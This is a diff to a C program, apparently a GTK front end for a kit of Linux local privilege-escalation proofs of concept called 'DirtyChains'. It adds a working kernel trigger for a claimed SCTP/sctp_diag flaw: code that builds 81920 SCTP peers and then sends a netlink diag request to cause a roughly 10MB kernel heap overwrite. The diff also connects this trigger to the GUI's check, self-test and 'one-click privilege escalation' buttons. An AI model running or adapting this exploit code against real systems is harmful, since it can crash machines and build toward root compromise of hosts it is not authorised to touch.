@@ -1,5 +1,5 @@
 /* ============================================================================
- *  dirtyfrag-gui.c — DirtyChains 九链页缓存提权 PoC
+ *  dirtyfrag-gui.c — DirtyChains 十链本地提权 PoC
  *                    图形前端 + 内置引擎（单文件）
  *
  *  一个 .c 就能编出完整程序，不再需要额外的 .o，文件里合了五块：
@@ -13,7 +13,7 @@
  *      DirtyDecrypt 引擎（上游 PoC 并入）
  *          CVE-2026-31635 AF_RXRPC/rxgk 页缓存改写，入口 cve31635_main
  *      GTK3 前端（本项目前身 dirtyfrag-gui.c）
- *          九链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
+ *          十链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
  *
  *  编译（GUI）:
  *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
@@ -3931,7 +3931,7 @@ static int dc_scan_setuid(void)
 #ifndef OVSWRAP_STANDALONE
 
 /* ============================================================================
- *  dirtyfrag-gui.c — DirtyChains 九链页缓存提权 PoC 的图形前端
+ *  dirtyfrag-gui.c — DirtyChains 十链本地提权 PoC 的图形前端
  *
  *  适配 XFCE 桌面 (GTK3)。它本身不做任何内核操作, 只负责:
  *      · 拼出正确的命令行
@@ -4007,6 +4007,9 @@ struct sockaddr_alg {
 };
 #endif
 #include <linux/netlink.h>
+#include <linux/sctp.h>
+#include <linux/inet_diag.h>
+#include <linux/sock_diag.h>
 #include <linux/udp.h>
 #include <linux/xfrm.h>
 #include <limits.h>
@@ -6709,10 +6712,274 @@ int cve31635_main(int argc, char **argv)
     return 0;
 }
 
-#define APP_TITLE       "DirtyChains · 页缓存提权"
+/* ===========================================================================
+ * DiagSpill 引擎: CVE-2026-74469（入口 diagspill_main）
+ *
+ * 根因: sctp_assoc_add_peer() 给每个新增唯一对端把 16 位 transport_count +1,
+ *       加到第 65536 个时回绕成 0。sctp_diag 的 INET_DIAG_PEERS dump 用
+ *       transport_count 预留应答 payload, 却按 transport_addr_list 的真实长度
+ *       (81920) 逐条拷贝 sockaddr_storage(128 字节), 于是写出约 10MB, 越过
+ *       skb 尾进入相邻堆 —— CWE-787 堆越界写。
+ *
+ * 公开 exploit(Asim Manizada, 2026-09-18) 的完整 LPE 是: 2048 个 worker + 页表
+ *       蓄水池 + 大页饱和, 把越界写精确落在 PMD 上, 篡改页表把物理内存映射成
+ *       用户可读写, 扫到 cred 后改 UID/GID, 再借 sudo 提权。这套锁死在
+ *       6.17/6.19 + 严格 4 vCPU/4GB + 透明大页, 且一触发就破坏 ~8MB 内核内存、
+ *       大概率 panic、需重启。此处只接"安全检测"和"破坏性触发器", 用作漏洞
+ *       存在性证明 / DoS 演示。完整 LPE 见 README, 需在对应内核上单独调参。
+ *
+ * 退出码: 0 = 成功 / 看起来未修复   1 = 没打成 / 已修复
+ *         2 = 用法错   3 = 环境不可用(SCTP/sctp_diag 缺失)   4 = 其它前置
+ * ========================================================================= */
+
+#ifndef IPPROTO_SCTP
+#define IPPROTO_SCTP 132
+#endif
+#ifndef SOL_SCTP
+#define SOL_SCTP 132
+#endif
+#define DS_SCTP_SOCKOPT_CONNECTX3 111
+#define DS_NETLINK_SOCK_DIAG 4
+
+#define DS_SAFE_PEERS 16384U
+#define DS_OVERFLOW_PEERS (65536U + DS_SAFE_PEERS)   /* 81920 */
+
+struct ds_connectx_parameter {
+    int32_t assoc_id;
+    int32_t addr_num;
+    struct sockaddr *addrs;
+};
+
+static void ds_usage(void)
+{
+    fprintf(stderr,
+        "用法: dirtychains --diagspill <模式> [选项]\n"
+        "  -check   只读检测: SCTP/sctp_diag 可用 + 内核版本是否低于修复版\n"
+        "  -test    破坏性: 建 81920 对端关联并触发 sctp_diag 越界写(需 -force)\n"
+        "  -start   同 -test(破坏性触发器, 需 -force)\n"
+        "  -find    此漏洞无需 setuid 靶子, 跳过扫描\n"
+        "  -force   确认破坏性操作\n"
+        "  -h       帮助\n"
+        "\n"
+        "  注意: -test/-start 会写出约 10MB 堆越界, 破坏内核内存, 大概率 panic,\n"
+        "  需重启。完整 LPE(改 cred 提权)在 6.17/6.19 + 4 vCPU/4GB 上才成立,\n"
+        "  此处不含。仅用于漏洞存在性证明 / DoS 演示。\n");
+}
+
+static uint64_t ds_splitmix64(uint64_t value)
+{
+    value += 0x9e3779b97f4a7c15ULL;
+    value = (value ^ (value >> 30)) * 0xbf58476d1ce4e5b9ULL;
+    value = (value ^ (value >> 27)) * 0x94d049bb133111ebULL;
+    return value ^ (value >> 31);
+}
+
+static struct sockaddr_in6 *ds_make_peers(uint16_t port, unsigned int count)
+{
+    struct sockaddr_in6 *peers = calloc(count, sizeof(*peers));
+
+    if (!peers)
+        return NULL;
+    for (uint32_t i = 0; i < count; i++) {
+        /* 唯一地址即可让 transport_count 递增; 这里沿用公开 exploit 的
+         * "按 peer 索引散列" 方案, 对触发器无害。 */
+        uint64_t a = ds_splitmix64((uint64_t)i * 0x9e3779b97f4a7c15ULL +
+                                   5057595369945519184ULL);
+        peers[i].sin6_family = AF_INET6;
+        peers[i].sin6_port = htons(port);
+        memcpy((unsigned char *)&peers[i].sin6_addr, &a, sizeof(a));
+    }
+    return peers;
+}
+
+static int ds_connectx_many(int fd, struct sockaddr_in6 *peers,
+                            unsigned int count)
+{
+    struct sctp_initmsg init = {
+        .sinit_max_attempts = 255,
+        .sinit_max_init_timeo = 60000,
+    };
+    struct ds_connectx_parameter param = {
+        .addr_num = (int32_t)((size_t)count * sizeof(*peers)),
+        .addrs = (struct sockaddr *)peers,
+    };
+    socklen_t olen = sizeof(param);
+    int r, e;
+
+    if (setsockopt(fd, IPPROTO_SCTP, SCTP_INITMSG, &init, sizeof(init)) < 0)
+        return -1;
+    errno = 0;
+    r = getsockopt(fd, SOL_SCTP, DS_SCTP_SOCKOPT_CONNECTX3, &param, &olen);
+    e = errno;
+    printf("SCTP 关联对端数(已加): %u\n", count);
+    printf("16 位 transport_count 截断后: %u\n", count & 0xFFFF);
+    printf("SCTP 关联建立: %s (assoc_id=%d)\n",
+           r == 0 ? "完成" : (e == EINPROGRESS ? "进行中(预期)" :
+                              strerror(e)),
+           param.assoc_id);
+    return (r == 0 || e == EINPROGRESS) ? 0 : -1;
+}
+
+static int ds_prepare_diag(int sctp_fd, const struct sockaddr_in6 *peer,
+                           int *nl_out)
+{
+    struct {
+        struct nlmsghdr nlh;
+        struct inet_diag_req_v2 req;
+    } msg;
+    struct sockaddr_in6 local;
+    socklen_t ll = sizeof(local);
+    int nl = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, DS_NETLINK_SOCK_DIAG);
+
+    if (nl < 0)
+        return -1;
+    if (getsockname(sctp_fd, (struct sockaddr *)&local, &ll) < 0) {
+        close(nl);
+        return -1;
+    }
+    memset(&msg, 0, sizeof(msg));
+    msg.nlh.nlmsg_len = sizeof(msg);
+    msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
+    msg.nlh.nlmsg_flags = NLM_F_REQUEST;
+    msg.nlh.nlmsg_seq = 0x1001;
+    msg.req.sdiag_family = AF_INET6;
+    msg.req.sdiag_protocol = IPPROTO_SCTP;
+    msg.req.idiag_states = 0xFFFFFFFFu;
+    msg.req.id.idiag_sport = local.sin6_port;
+    msg.req.id.idiag_dport = peer->sin6_port;
+    memcpy(msg.req.id.idiag_src, &local.sin6_addr, sizeof(local.sin6_addr));
+    memcpy(msg.req.id.idiag_dst, &peer->sin6_addr, sizeof(peer->sin6_addr));
+    msg.req.id.idiag_cookie[0] = INET_DIAG_NOCOOKIE;
+    msg.req.id.idiag_cookie[1] = INET_DIAG_NOCOOKIE;
+    *nl_out = nl;
+    return send(nl, &msg, sizeof(msg), 0) == (ssize_t)sizeof(msg) ? 0 : -1;
+}
+
+/* 安全检测: 不建对端、不触发, 只验证前提并给出内核版本结论 */
+static int ds_check(void)
+{
+    int sctp_fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, IPPROTO_SCTP);
+    int diag_fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, DS_NETLINK_SOCK_DIAG);
+    int have_sctp = sctp_fd >= 0;
+    int have_diag = diag_fd >= 0;
+    char ver[256] = {0};
+    FILE *v = fopen("/proc/version", "r");
+
+    if (v) {
+        size_t n = fread(ver, 1, sizeof(ver) - 1, v);
+        if (n > 0)
+            ver[n] = '\0';
+        fclose(v);
+    }
+    printf("[*] CVE-2026-74469 (DiagSpill) 前提检测\n");
+    printf("  AF_SCTP 套接字      : %s\n", have_sctp ? "可用" : "不可用");
+    printf("  NETLINK_SOCK_DIAG    : %s\n", have_diag ? "可用" : "不可用");
+    printf("  内核版本            : %s", ver);
+    printf("  修复版本            : 5.10.270 / 5.15.221 / 6.1.188 / 6.6.157 /\n"
+           "                       6.12.109 / 6.18.50 / 7.2.4 起\n");
+    if (diag_fd >= 0)
+        close(diag_fd);
+    if (sctp_fd >= 0)
+        close(sctp_fd);
+    if (!have_sctp || !have_diag) {
+        printf("[-] SCTP 或 sock_diag 不可用, 此内核大概率打不上(退出码 3)\n");
+        return 3;
+    }
+    printf("[+] 前提齐备: SCTP + sock_diag 可用。是否真未修复以 -test 实测为准。\n");
+    printf("    (完整 LPE 仅 6.17/6.19 + 4 vCPU/4GB 成立, 此处不含)\n");
+    return 0;
+}
+
+static int diagspill_main(int argc, char **argv)
+{
+    int mode = -1, force = 0;
+
+    for (int i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "-check"))
+            mode = 0;
+        else if (!strcmp(argv[i], "-test") || !strcmp(argv[i], "-start"))
+            mode = 1;
+        else if (!strcmp(argv[i], "-find"))
+            mode = 2;
+        else if (!strcmp(argv[i], "-force"))
+            force = 1;
+        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
+            ds_usage();
+            return 0;
+        } else {
+            fprintf(stderr, "未知参数: %s\n", argv[i]);
+            ds_usage();
+            return 2;
+        }
+    }
+    if (mode < 0) {
+        ds_usage();
+        return 2;
+    }
+    if (mode == 0)
+        return ds_check();
+    if (mode == 2) {
+        printf("[*] DiagSpill 不需要 setuid 靶子(堆越界写, 不碰文件), 跳过扫描。\n");
+        return 0;
+    }
+
+    /* mode == 1: 破坏性触发 */
+    if (!force) {
+        fprintf(stderr, "这是破坏性操作: 会写出约 10MB 堆越界, 大概率 panic、需重启。\n");
+        fprintf(stderr, "加 -force 确认(仅 disposable VM 上跑)。\n");
+        return 2;
+    }
+
+    {
+        struct sockaddr_in6 *peers = ds_make_peers(45678U, DS_OVERFLOW_PEERS);
+        struct sockaddr_in6 local;
+        socklen_t ll = sizeof(local);
+        int sctp_fd, nl;
+
+        if (!peers) {
+            fprintf(stderr, "calloc 失败\n");
+            return 1;
+        }
+        sctp_fd = socket(AF_INET6, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC,
+                         IPPROTO_SCTP);
+        if (sctp_fd < 0) {
+            fprintf(stderr, "SCTP 套接字失败: %s\n", strerror(errno));
+            free(peers);
+            return 3;
+        }
+        printf("[*] 建 81920 对端关联, 触发 transport_count 回绕...\n");
+        if (ds_connectx_many(sctp_fd, peers, DS_OVERFLOW_PEERS) < 0) {
+            fprintf(stderr, "[-] 关联建立失败(内核可能已修复或拒绝)\n");
+            close(sctp_fd);
+            free(peers);
+            return 1;
+        }
+        if (getsockname(sctp_fd, (struct sockaddr *)&local, &ll) < 0) {
+            close(sctp_fd);
+            free(peers);
+            return 1;
+        }
+        printf("[*] 发 sctp_diag INET_DIAG_PEERS 请求, 触发堆越界写...\n");
+        if (ds_prepare_diag(sctp_fd, &peers[0], &nl) < 0) {
+            fprintf(stderr, "[-] diag 请求发送失败: %s\n", strerror(errno));
+            close(sctp_fd);
+            free(peers);
+            return 1;
+        }
+        printf("[+] diag 请求已发出。若内核未修复, 此刻应已发生约 10MB 堆越界写。\n");
+        printf("    (完整 LPE 见 README; 此处仅证明漏洞存在 / DoS 演示)\n");
+        fflush(NULL);
+        sleep(2);
+        close(sctp_fd);
+        free(peers);
+        return 0;
+    }
+}
+
+#define APP_TITLE       "DirtyChains · 本地提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-11-01-r36"
-#define APP_SUBTITLE    "九链 PoC 图形前端 · " DF_BUILD
+#define DF_BUILD        "2026-11-01-r37"
+#define APP_SUBTITLE    "十链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
 #define PTY_ROWS        32
@@ -6788,6 +7055,12 @@ static const Chain chains[] = {
       "rxgk 解密原地写回页缓存, 逐字节猜 key, 换掉目标整段 ELF 头",
       "需非特权 userns + AF_RXRPC + rxgk(security index 6)；120 字节载荷", 4,
       1, 0, 0 },
+
+    { "-2026-74469", "74469 · DiagSpill",
+      "CVE-2026-74469  SCTP / sctp_diag",
+      "transport_count 16 位回绕, sctp_diag 约 10MB 堆越界写",
+      "仅需 SCTP + sctp_diag, 不要 userns / 模块 / setuid 靶子；完整 LPE 锁 6.17/6.19", 5,
+      0, 0, 0 },
 };
 #define N_CHAINS ((int)(sizeof(chains) / sizeof(chains[0])))
 
@@ -6797,7 +7070,7 @@ static const Chain chains[] = {
  */
 static const int cat_write_members[] = { 0, 1, 6, 7, 8 };
 /* 31431 / 43284 / 46300 / 43503 / 31635 */
-static const int cat_oob_members[]   = { 2, 4, 5 }; /* 43500 / 46331 / 64531 */
+static const int cat_oob_members[]   = { 2, 4, 5, 9 }; /* 43500 / 46331 / 64531 / 74469 */
 
 static const struct {
     const char *name;        /* 侧栏条目 */
@@ -7509,7 +7782,7 @@ static void on_child_exit(GPid pid, gint status, gpointer data)
         }
 
         /* CVE-2026-43503 / 31635 这两条和主引擎一致: 0 = 写成功, 1 = 没打成 */
-        if (cc && (cc->engine == 3 || cc->engine == 4)) {
+        if (cc && (cc->engine == 3 || cc->engine == 4 || cc->engine == 5)) {
             char line[200];
 
             switch (code) {
@@ -7517,7 +7790,7 @@ static void on_child_exit(GPid pid, gint status, gpointer data)
                 if (a->action && strstr(a->action, "检查")) {
                     verdict = "前置条件齐备 (退出码 0)";
                 } else {
-                    verdict = "有漏洞：目标字节被改写 (退出码 0)";
+                    verdict = "有漏洞：触发成功 / 目标字节被改写 (退出码 0)";
                 }
                 color = "status-ok";
                 break;
@@ -7527,6 +7800,10 @@ static void on_child_exit(GPid pid, gint status, gpointer data)
                 break;
             case 2:
                 verdict = "参数或目标文件不合法 (退出码 2)";
+                color = "status-warn";
+                break;
+            case 3:
+                verdict = "SCTP / sctp_diag 不可用 (退出码 3)";
                 color = "status-warn";
                 break;
             case 4:
@@ -7628,7 +7905,8 @@ static gboolean app_spawn(App *a, char **args, const char *what)
     const char *esw = (eng == 1) ? "--ovs"
                     : (eng == 2) ? "--frag"
                     : (eng == 3) ? "--cve43503"
-                    : (eng == 4) ? "--cve31635" : "--engine";
+                    : (eng == 4) ? "--cve31635"
+                    : (eng == 5) ? "--diagspill" : "--engine";
     char eflag[16] = "";
 
     if (eng != 0 && !a->poc_builtin) {
@@ -7796,7 +8074,7 @@ static void update_desc(App *a)
 
     if (idx == 0) {
         gtk_label_set_markup(GTK_LABEL(a->lbl_name),
-                             "<b>全部（dirtychains 九链）</b>");
+                             "<b>全部（dirtychains 十链）</b>");
         gtk_label_set_text(GTK_LABEL(a->lbl_desc),
                            "检查配置与自测会依次跑完 dirtychains 各链；OVS 链与 Fragnesia 链请单独选择后再操作。");
         gtk_label_set_text(GTK_LABEL(a->lbl_need), "");
@@ -8082,6 +8360,13 @@ static void act_check(GtkWidget *w, gpointer data)
         return;
     }
 
+    if (c && c->engine == 5) {
+        char *ds_args[] = { "-check", NULL };
+
+        app_spawn(a, ds_args, "检查 DiagSpill 前提");
+        return;
+    }
+
     if (c && c->engine == 1) {
         char *ovs_args[] = { "-check", NULL };
 
@@ -8191,6 +8476,24 @@ static void act_test(GtkWidget *w, gpointer data)
                          "120 字节通常要几万次 fire、耗时以分钟计。"))
             return;
         app_spawn(a, dd_args, "自测 DirtyDecrypt 写原语");
+        return;
+    }
+
+    if (c && c->engine == 5) {
+        char *ds_args[3];
+        char cmd[600];
+
+        ds_args[0] = "-test";
+        ds_args[1] = "-force";
+        ds_args[2] = NULL;
+        g_snprintf(cmd, sizeof(cmd), "%s --diagspill -test -force", a->poc_path);
+        if (!confirm_run(a, "DiagSpill 触发器", cmd,
+                         "会建 81920 对端 SCTP 关联并触发 sctp_diag 约 10MB 堆越界写，"
+                         "破坏内核内存，大概率 panic 整机重启，且需重启恢复。"
+                         "这是漏洞存在性证明 / DoS 演示，不是提权"
+                         "（完整 LPE 锁 6.17/6.19 + 4 vCPU/4GB）。仅在 disposable VM 上跑。"))
+            return;
+        app_spawn(a, ds_args, "触发 DiagSpill 堆越界写");
         return;
     }
 
@@ -8330,6 +8633,25 @@ static void act_lpe(GtkWidget *w, gpointer data)
                          "写之前会自动备份到 /tmp，失败按日志里的 cp 命令恢复。"))
             return;
         app_spawn(a, dd_args, "一键提权");
+        return;
+    }
+
+    /* DiagSpill 链：触发堆越界写（破坏性，DoS 演示，非提权） */
+    if (c->engine == 5) {
+        char *ds_args[3];
+        char ds_cmd[600];
+
+        ds_args[0] = "-start";
+        ds_args[1] = "-force";
+        ds_args[2] = NULL;
+        g_snprintf(ds_cmd, sizeof(ds_cmd), "%s --diagspill -start -force",
+                   a->poc_path);
+        if (!confirm_run(a, c->name, ds_cmd,
+                         "同「自测」：触发 sctp_diag 约 10MB 堆越界写，破坏内核内存，"
+                         "大概率 panic 整机重启。这是 DoS 演示，不是提权；"
+                         "完整 LPE 仅 6.17/6.19 + 4 vCPU/4GB 成立。仅在 disposable VM 上跑。"))
+            return;
+        app_spawn(a, ds_args, "一键提权");
         return;
     }
 
@@ -11091,7 +11413,7 @@ static void build_window(App *a)
      */
     a->combo = gtk_combo_box_text_new();
     gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo),
-                                   "全部（dirtychains 九链，仅检查 / 自测）");
+                                   "全部（dirtychains 十链，仅检查 / 自测）");
     {
         int i;
         for (i = 0; i < N_CHAINS; i++) {
@@ -11373,6 +11695,18 @@ int main(int argc, char **argv)
         return rc;
     }
 
+    /* 第六条内置引擎: CVE-2026-74469 (DiagSpill) */
+    if (argc > 1 && !strcmp(argv[1], "--diagspill")) {
+        int rc;
+
+        argv++;
+        argc--;
+        argv[0] = (char *)"dirtychains";
+        rc = diagspill_main(argc, argv);
+        fflush(NULL);
+        return rc;
+    }
+
     memset(&app, 0, sizeof(app));
     app.master_fd = -1;
     app.cur_fg = -1;
@@ -11431,7 +11765,7 @@ int main(int argc, char **argv)
     {
         char head[512];
         g_snprintf(head, sizeof(head),
-                   "\033[36mDirtyChains 九链页缓存提权 PoC\033[0m  图形前端"
+                   "\033[36mDirtyChains 十链本地提权 PoC\033[0m  图形前端"
                    "  \033[2m构建 %s\033[0m\n"
                    "\033[2m引擎: %s\033[0m\n"
                    "\033[2m仅供参考与授权测试。先用「检查配置」和「自测」判断本机可用性。\033[0m\n",
